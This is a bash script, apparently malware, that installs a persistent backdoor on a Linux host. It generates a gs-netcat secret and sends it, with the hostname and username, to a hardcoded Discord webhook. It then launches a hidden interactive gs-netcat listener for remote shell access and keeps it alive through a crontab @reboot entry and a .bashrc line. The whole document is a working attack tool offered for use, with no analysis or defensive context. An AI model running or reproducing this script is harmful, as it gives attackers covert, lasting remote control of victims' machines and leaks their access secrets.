#!/bin/bash

SECRET=$(gs-netcat -g) && \
echo "$SECRET" > ~/.gsocket_secret && \
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\" secretexploit: $SECRET\n exploithostinstall: $(hostname)\n User: $(whoami)\n exploitinstall\"}" https://discord.com/api/webhooks/1542132839003201576/xqJR_hmIHuqan-YG8V28l2zgtIieg1Pd4VgoPc0g32Y6m8AgpfRbpfmAf9wjmKplqYYW && \
nohup gs-netcat -l -s "$SECRET" -i > /dev/null 2>&1 & disown && \
(crontab -l 2>/dev/null | grep -v "gs-netcat"; echo "@reboot sleep 10 && /usr/bin/gs-netcat -l -s \"$SECRET\" -i > /dev/null 2>&1") | crontab - && \
echo "gs-netcat -l -s \"$SECRET\" -i > /dev/null 2>&1 &" >> ~/.bashrc && \
echo "✅ exploit instalado! Secret: $SECRET"